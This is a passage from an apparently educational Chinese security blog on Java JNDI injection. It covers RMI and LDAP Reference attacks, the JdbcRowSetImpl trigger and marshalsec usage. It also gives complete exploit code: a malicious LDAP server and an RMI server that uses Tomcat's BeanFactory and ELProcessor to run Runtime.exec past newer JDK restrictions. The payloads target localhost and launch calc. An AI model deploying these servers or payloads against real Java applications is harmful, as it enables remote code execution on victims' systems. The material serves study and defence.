+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/10.png" class="">
+<h4 id="对象工厂RCE的触发位置">对象工厂RCE的触发位置</h4>
+<p>NamingManager.getObjectFactoryFromReference之中对工厂实例化了</p>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/11.png" class="">
+<p>那么可以在编造恶意对象工厂时：把RCE代码插在构造方法、静态代码块，以及被调用的重写getObjectInstance之中，都可以达到RCE</p>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/12.png" class="">
+<h4 id="JdbcRowSetImpl触发注入">JdbcRowSetImpl触发注入</h4>
+<p>Matthias Kaiser(@matthias_kaiser)发现com.sun.rowset.JdbcRowSetImpl类的execute()也可以触发JNDI注入</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDIInjection.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplRMI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        jdbcRowSet.setDataSourceName(<span class="string">&quot;rmi://127.0.0.1/hacked&quot;</span>);</span><br><span class="line">        jdbcRowSet.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/13.png" class="">
+<p>JdbcRowSetImpl.execute首先调用prepare()</p>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/14.png" class="">
+<p>然后调用connect()</p>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/15.png" class="">
+<p>初次链接conn为空，然后就会执行InitialContext.lookup()，因此只要<code>JdbcRowSet.setDataSourceName(&quot;rmi://xxx/yyy&quot;)</code>把数据源地址设置为恶意Server端即可</p>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/19.png" class="">
+<p>这也是fastjson的注入原理</p>
+<h3 id="LDAP-Reference">LDAP + Reference</h3>
+<h4 id="原理-4">原理</h4>
+<p>原理与RMI协议基本一致，不受<code>com.sun.jndi.rmi.object.trustURLCodebase</code>等属性的限制</p>
+<p>LDAP服务器可以返回恶意工厂，通过以下字段指定：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">entry.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">entry.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">entry.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, url);</span><br><span class="line">entry.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;b&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h4 id="maven依赖">maven依赖</h4>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="代码实现-2">代码实现</h4>
+<p>攻击者起一个ldap服务器然后绑定Reference对象</p>
+<ul class="lvl-0">
+<li class="lvl-3">
+<p>编写private static class继承InMemoryOperationInterceptor，自定义ldap操作拦截器</p>
+</li>
+<li class="lvl-3">
+<p>配置监听选项ldap config</p>
+</li>
+<li class="lvl-3">
+<p>创建ldap服务对象并开启监听</p>
+</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDIInjection.ldap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(<span class="string">&quot;dc=example,dc=com&quot;</span>);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>),</span><br><span class="line">                <span class="number">389</span>,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()</span><br><span class="line">        ));</span><br><span class="line">        config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>());</span><br><span class="line">        <span class="type">InMemoryDirectoryServer</span> <span class="variable">directoryServer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">        directoryServer.startListening();</span><br><span class="line">        System.out.println(<span class="string">&quot;ldap://127.0.0.1:389/hacked is working...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;JNDIInjection.server.EvilObjectFactory&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;file://C:\\xxx\\JNDIInjection\\server\\EvilObjectFactory.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            entry.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, className);</span><br><span class="line">            entry.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, className);</span><br><span class="line">            entry.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, url);</span><br><span class="line">            entry.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                result.sendSearchEntry(entry);</span><br><span class="line">                result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>受害者lookup，URL<code>ldap://URL/xxx</code>，其中xxx任意均可完成注入</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDIInjection.ldap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LadpClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(<span class="string">&quot;ldap://127.0.0.1/hacked&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="marshalsec构建恶意ldap服务">marshalsec构建恶意ldap服务</h5>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/<span class="comment">#EvilObjectFactoryExploit 6666</span></span><br></pre></td></tr></table></figure>
+<p>这次不用起http server了</p>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/16.png" class="">
+<h4 id="限制-3">限制</h4>
+<blockquote>
+<p>在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。</p>
+</blockquote>
+<ul class="lvl-0">
+<li class="lvl-3">
+<p><code>com.sun.jndi.ldap.object.trustURLCodebase</code>设置为true</p>
+</li>
+</ul>
+<h4 id="调用链-2">调用链</h4>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InitialContext.lookup()</span><br><span class="line">ldapURLContext.lookup()</span><br><span class="line">GenericURLContext.lookup()</span><br><span class="line">PartialConpositeContext.lookup()</span><br><span class="line">ComponentContext.p_lookup()</span><br><span class="line">LdapCtx.c_lookup()</span><br><span class="line">DirectoryManager.getObjectInstance()</span><br><span class="line">EvilObjectFactory.getObjectInstance()</span><br></pre></td></tr></table></figure>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/17.png" class="">
+<h4 id="JdbcRowSetImpl触发注入-2">JdbcRowSetImpl触发注入</h4>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/18.png" class="">
+<h2 id="参考-5">参考</h2>
+<blockquote>
+<p><a href="https://paper.seebug.org/942/">如何绕过高版本 JDK 的限制进行 JNDI 注入利用</a><a href="https://zhuanlan.zhihu.com/p/41806870">技术专栏 | 深入理解JNDI注入与Java反序列化漏洞利用</a><br>
+<a href="https://www.cnblogs.com/zpchcbd/p/14880727.html">JAVA JNDI注入(一)</a><br>
+<a href="http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/">java-jndi注入知识详解</a></p>
+</blockquote>
+<h2 id="完-9">完</h2>
+<blockquote>
+<p>版权属于：Ho1aAs<br>
+欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
+版权声明：本文为原创，来源于上述网站，转载时须注明出处及本声明</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>JNDI注入</category>
+      </categories>
+      <tags>
+        <tag>Java安全</tag>
+        <tag>JNDI注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>绕过JDK高版本限制进行JNDI注入</title>
+    <url>/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="常见绕过方式">常见绕过方式</h2>
+<p>对于JDK版本11.0.1、8u191、7u201、6u211及以上，RMI和LDAP的trustURLCodebase已经被限制，但是还存在几种方法绕过</p>
+<ol>
+<li class="lvl-5">
+<p>使用受害者本地的类作为恶意Reference Factory攻击RMI</p>
+</li>
+<li class="lvl-5">
+<p>利用LDAP返回序列化数据触发Gadget</p>
+</li>
+</ol>
+<span id="more"></span>
+<h2 id="演示版本">演示版本</h2>
+<p>Java版本8u261</p>
+<h2 id="寻找本地的类作为恶意工厂攻击RMI">寻找本地的类作为恶意工厂攻击RMI</h2>
+<p>JNDI基础篇提到：对象工厂需要实现<code>javax.naming.spi.ObjectFactory</code>接口的getObjectInstance方法，使用IDEA ctrl+H获取子类</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/1.png" class="">
+<p>tomcat-catalina.jar中<code>org.apache.naming.factory.BeanFactory</code>正好符合</p>
+<h3 id="探究BeanFactory类">探究BeanFactory类</h3>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<hr/>
+<p>BeanFactory恰好有getObjectInstance()，首先获取传入Reference类的className属性，然后调用无参数的构造方法实例化所指向的类</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/2.png" class="">
+<p>实例化成功后，获取Reference的forceString参数，<strong>这里类型转换为String</strong>，然后按照逗号分割成String数组</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/3.png" class="">
+<p>然后对于每一个数组元素：判断是否包含等号，如果包含等号：<strong>等号后面作为propName</strong>、等号前面作为param（注意这里substring的范围不要看反了）；如果没有等号那么加set。</p>
+<p>然后向空hashmap添加项目，键为param <strong>值为beanClass中名称是propName的方法</strong></p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/4.png" class="">
+<p>之后反射调用forced中的方法，这里propName是上面的param，传入的参数是Reference属性名param对应的值。</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/5.png" class="">
+<p>不方便理解的话，这里举个例子：forceString赋值<code>a=eval</code>，Reference里面有一个属性a的值是print()，那么最终就会调用beanClass的eval方法，然后传入的参数是字符串print()。</p>
+<p>那么接下来就要找到可以RCE的类</p>
+<h3 id="Poc">Poc</h3>
+<h4 id="javax-el-ELProcessor">javax.el.ELProcessor</h4>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-el --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个类中Tomcat依赖里面，可以通过传参实现RCE</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/6.png" class="">
+<p>根据上面的分析编写rmiServer端</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDIInjection.HighVer.LocalClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanFactoryRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=eval&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));</span><br><span class="line"><span class="comment">//        resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()\&quot;)&quot;));</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;el&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi://127.0.0.1:1099/el&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果要多次执行就可以用逗号分隔forceString</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=eval,b=eval&quot;</span>));</span><br><span class="line"></span><br><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;control\&quot;)&quot;</span>));</span><br><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));</span><br></pre></td></tr></table></figure>
+<h5 id="代码审计-6">代码审计</h5>
+<p>lookup的过程与普通rmi原理一致，直接来到<code>com.sun.jndi.rmi.registry.RegistryContext</code>的decodeObject方法</p>
+<p>ResourceRef传给了var8，然后进行是否开启trustURLCodebase的判断</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/7.png" class="">
+<p>这里由于三个条件是and关系，一个为假就可以绕过。注意getFactoryClassLocation参数，创建ResourceRef的时候就赋值为空所以可以绕过<img src="%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/8.png" alt=""><img src="%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/9.png" alt="">绕过if来到通过对象工厂实例化对象的函数，这里也跟普通rmi原理一样的</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/10.png" class="">来到BeanFactory
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/11.png" class="">新建ELProcessor实例，并且获取forceString字段
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/12.png" class="">
+<p>拆分字段，保存键值对</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/13.png" class="">
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/14.png" class="">遍历Addr，获取到最后一项元素也就是我们自创的键a
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/15.png" class="">
+<p>invoke哈希表中键a对应的函数，传参是Addr中属性a对应的字符串值（注意这里出现了两个a）</p>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/16.png" class="">
+<p>之后就是eval了，不再赘述</p>
+<h5 id="调用栈">调用栈</h5>
+<img src="/2022/06/20/JNDI%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/17.png" class="">
+<h4 id="Groovy-lang-GroovyShell">Groovy.lang.GroovyShell</h4>
+<p>如果有Groovy环境可以使用，调用<code>GroovyShell.evaluate()</code></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.codehaus.groovy/groovy-all --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
